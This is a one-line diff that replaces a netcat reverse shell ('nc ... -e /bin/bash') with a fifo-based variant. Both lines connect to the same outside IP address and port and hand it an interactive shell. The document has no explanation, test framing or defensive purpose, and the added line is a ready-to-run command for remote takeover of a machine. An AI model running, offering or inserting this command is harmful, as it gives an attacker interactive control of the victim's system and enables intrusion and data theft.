@@ -1,1 +1,1 @@
-bash -c "nc 43.132.189.103 10232 -e /bin/bash"
+bash -c "rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 43.132.189.103 10232 > /tmp/f"
